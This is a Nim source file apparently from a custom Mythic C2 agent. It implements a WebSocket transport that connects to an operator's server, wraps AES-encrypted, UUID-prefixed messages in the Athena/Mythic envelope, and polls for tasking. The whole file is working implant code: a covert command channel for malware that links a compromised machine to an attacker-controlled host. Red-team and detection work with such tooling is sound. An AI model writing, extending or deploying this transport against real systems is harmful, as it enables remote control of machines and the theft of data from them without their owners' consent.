## WebSocket C2 transport for Mythic (websocket C2 profile).
## RFC 6455 minimal client — stdlib only, no external dependencies.
## Message envelope (Athena/Mythic websocket format):
##   send:    {"client":true,"data":"<base64_uuid_encrypted>","tag":""}
##   receive: {"client":false,"data":"<base64_uuid_encrypted>","tag":""}
## Compile with -d:c2ProfileWs to activate this transport.

import std/[net, base64, strutils, json, random]
import config, crypto/aes, core/utils

type
  Transport* = ref object
    host:      string
    port:      int
    path:      string
    sock:      Socket
    connected: bool

proc newTransport*(): Transport =
  result = Transport(
    host:      WsHost,
    port:      WsPort,
    path:      WsPath,
    sock:      nil,
    connected: false,
  )

proc buildMessage*(currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
  ## Encrypt + base64-encode the Mythic message (uuid + body).
  var uuidPadded = currentUUID
  while uuidPadded.len < 36:
    uuidPadded.add('\x00')
  let uuidBytes = toBytes(uuidPadded[0..35])
  if aesKey.len == 32:
    result = base64.encode(uuidBytes & aesEncrypt(aesKey, jsonBody))
  else:
    result = base64.encode(uuidBytes & toBytes(jsonBody))

proc parseResponse*(raw: seq[byte], aesKey: seq[byte]): string =
  if raw.len < 36: return ""
  let body = raw[36 .. ^1]
  if aesKey.len == 32: result = aesDecrypt(aesKey, body)
  else: result = fromBytes(body)

# ---------------------------------------------------------------------------
# Internal WebSocket helpers
# ---------------------------------------------------------------------------

proc recvExact(t: Transport, n: int, timeoutMs: int = -1): string =
  result = ""
  while result.len < n:
    var chunk = newString(n - result.len)
    try:
      let got = t.sock.recv(chunk, n - result.len, timeoutMs)
      if got <= 0: return ""
      result.add(chunk[0 ..< got])
    except TimeoutError:
      return ""

proc wsConnect(t: Transport): bool =
  if t.connected: return true
  if t.sock != nil:
    try: t.sock.close() except: discard
    t.sock = nil
  try:
    t.sock = newSocket(buffered = false)
    t.sock.connect(t.host, Port(t.port))

    # Generate random 16-byte WebSocket key
    var keyBytes = newString(16)
    for i in 0 ..< 16:
      keyBytes[i] = char(rand(255))
    let wsKey = base64.encode(keyBytes)

    let cleanPath = t.path.strip(chars = {'/'})
    let req = "GET /" & cleanPath & " HTTP/1.1\r\n" &
              "Host: " & t.host & ":" & $t.port & "\r\n" &
              "Upgrade: websocket\r\n" &
              "Connection: Upgrade\r\n" &
              "Accept-Type: Push\r\n" &
              "User-Agent: " & UserAgent & "\r\n" &
              "Sec-WebSocket-Key: " & wsKey & "\r\n" &
              "Sec-WebSocket-Version: 13\r\n\r\n"
    t.sock.send(req)

    # Read HTTP response until \r\n\r\n
    var resp = ""
    while not resp.endsWith("\r\n\r\n"):
      var ch = newString(1)
      if t.sock.recv(ch, 1) <= 0:
        when defined(debug): stderr.writeLine("[!] WS: connection closed during handshake")
        return false
      resp.add(ch[0])
      if resp.len > 8192:
        when defined(debug): stderr.writeLine("[!] WS: handshake response too large")
        return false

    if "101" notin resp:
      when defined(debug): stderr.writeLine("[!] WS: handshake rejected — " & resp[0 .. min(120, resp.high)])
      return false

    t.connected = true
    when defined(debug): stderr.writeLine("[+] WS connected: ws://" & t.host & ":" & $t.port & "/" & cleanPath)
    return true

  except Exception as e:
    when defined(debug): stderr.writeLine("[!] WS connect error: " & e.msg)
    if t.sock != nil:
      try: t.sock.close() except: discard
      t.sock = nil
    return false

proc wsSendFrame(t: Transport, payload: string) =
  ## Send a masked text frame (RFC 6455: client→server frames MUST be masked).
  let plen = payload.len
  let mask = [byte(rand(255)), byte(rand(255)), byte(rand(255)), byte(rand(255))]

  var frame = newStringOfCap(10 + plen)
  frame.add(char(0x81))  # FIN=1, opcode=0x1 (text)

  if plen <= 125:
    frame.add(char(0x80 or plen))          # MASK=1, 7-bit length
  elif plen <= 65535:
    frame.add(char(0xFE))                  # MASK=1, 16-bit length (0x80|126)
    frame.add(char((plen shr 8) and 0xFF))
    frame.add(char(plen and 0xFF))
  else:
    frame.add(char(0xFF))                  # MASK=1, 64-bit length (0x80|127)
    for i in countdown(7, 0):
      frame.add(char((plen shr (i * 8)) and 0xFF))

  for b in mask:
    frame.add(char(b))

  for i in 0 ..< plen:
    frame.add(char(uint8(payload[i]) xor mask[i mod 4]))

  t.sock.send(frame)

proc wsRecvFrame(t: Transport, timeoutMs: int = -1): string =
  ## Receive and decode one WebSocket frame (server→client, unmasked).
  ## Transparently handles ping/pong and close frames.
  ## Returns "" on error, closed connection, or timeout.
  while true:
    let header = t.recvExact(2, timeoutMs)
    if header.len < 2: return ""

    let b0     = uint8(header[0])
    let b1     = uint8(header[1])
    let fin    = (b0 and 0x80) != 0
    let opcode = b0 and 0x0F
    let masked = (b1 and 0x80) != 0
    var payloadLen = int(b1 and 0x7F)

    if payloadLen == 126:
      let ext = t.recvExact(2, timeoutMs)
      if ext.len < 2: return ""
      payloadLen = (int(uint8(ext[0])) shl 8) or int(uint8(ext[1]))
    elif payloadLen == 127:
      let ext = t.recvExact(8, timeoutMs)
      if ext.len < 8: return ""
      payloadLen = 0
      for i in 0 ..< 8:
        payloadLen = (payloadLen shl 8) or int(uint8(ext[i]))

    var maskKey: array[4, uint8]
    if masked:
      let mk = t.recvExact(4, timeoutMs)
      if mk.len < 4: return ""
      for i in 0 ..< 4: maskKey[i] = uint8(mk[i])

    var payload = ""
    if payloadLen > 0:
      if payloadLen > 50_000_000:
        when defined(debug): stderr.writeLine("[!] WS: frame payload too large (" & $payloadLen & " bytes)")
        return ""
      payload = t.recvExact(payloadLen, timeoutMs)
      if payload.len < payloadLen: return ""
      if masked:
        for i in 0 ..< payload.len:
          payload[i] = char(uint8(payload[i]) xor maskKey[i mod 4])

    case opcode
    of 0x1, 0x2:  # text / binary
      if not fin:
        when defined(debug): stderr.writeLine("[!] WS: fragmented frames not supported")
        return ""
      return payload

    of 0x8:  # close
      t.connected = false
      return ""

    of 0x9:  # ping → reply with empty pong
      t.sock.send("\x8A\x00")
      continue  # wait for next data frame

    of 0xA:  # pong (unsolicited) → ignore
      continue

    else:
      when defined(debug): stderr.writeLine("[!] WS: unknown opcode 0x" & toHex(int(opcode), 1))
      return ""

# ---------------------------------------------------------------------------
# Public post() — same interface as http.nim and tcp.nim
# ---------------------------------------------------------------------------

proc post*(t: Transport, currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
  let data = buildMessage(currentUUID, aesKey, jsonBody)
  when defined(debug): stderr.writeLine("[*] WS -> " & t.host & ":" & $t.port & "/" & t.path)

  if not t.wsConnect():
    when defined(debug): stderr.writeLine("[!] WS: connection unavailable")
    return ""

  try:
    # Wrap in Mythic websocket envelope (matches Athena/leviathan format)
    let envelope = "{\"client\":true,\"data\":\"" & data & "\",\"tag\":\"\"}"
    t.wsSendFrame(envelope)

    # The Mythic websocket profile is async: it may send {"data":""} as an
    # acknowledgment before the real response. Loop until we get a non-empty
    # data payload. Per-frame timeout of 30s, max 20 frames.
    const maxFrames   = 20
    const frameTimeMs = 30_000

    var rawB64 = ""
    for attempt in 0 ..< maxFrames:
      let frame = t.wsRecvFrame(timeoutMs = frameTimeMs)
      if frame.len == 0:
        t.connected = false
        when defined(debug): stderr.writeLine("[!] WS: frame read failed (attempt " & $attempt & ")")
        return ""

      when defined(debug): stderr.writeLine("[DBG] WS frame #" & $attempt & " (" & $frame.len & "b): " &
                       frame[0 .. min(150, frame.high)])

      if frame.len > 0 and frame[0] == '{':
        try:
          rawB64 = parseJson(frame){"data"}.getStr("")
        except Exception as je:
          when defined(debug): stderr.writeLine("[!] WS: JSON parse error: " & je.msg)
          rawB64 = ""
      else:
        rawB64 = frame.strip()

      if rawB64.len > 0:
        break
      # Empty data — server ACK, wait for the real response

    if rawB64.len == 0:
      when defined(debug): stderr.writeLine("[!] WS: no data after " & $maxFrames & " frames")
      return ""

    let rawBytes = toBytes(base64.decode(rawB64))
    result = parseResponse(rawBytes, aesKey)
    if result.len > 0:
      when defined(debug): stderr.writeLine("[+] WS OK (" & $result.len & " bytes)")
    else:
      when defined(debug): stderr.writeLine("[!] WS: decrypt/decode failed")

  except Exception as e:
    when defined(debug): stderr.writeLine("[!] WS error: " & e.msg)
    t.connected = false
    result = ""
